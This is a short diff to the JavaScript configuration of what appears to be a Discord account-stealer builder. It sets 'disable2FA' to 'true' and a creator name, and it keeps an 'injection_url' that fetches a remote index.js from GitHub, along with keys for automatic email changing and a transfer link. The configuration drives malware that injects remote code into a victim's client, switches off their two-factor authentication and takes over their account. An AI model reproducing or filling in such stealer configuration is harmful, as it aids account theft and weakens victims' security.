@@ -17,10 +17,10 @@ var config = {
   "logout-notify": "true",
   "init-notify": "true",
   "embed-color": 4873727,
-  disable2FA: "%DISABLEFA%",
+  disable2FA: "true",
   changeMailAuto: "%AUTOMAILCHANGER%",
   mail: "%CLIENTEMAIL%",
-  creator: "%NAME_CREATOR%",
+  creator: "moi",
   transfer_link: `%TRANSFER_URL%`,
   injection_url:
     "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/index.js",
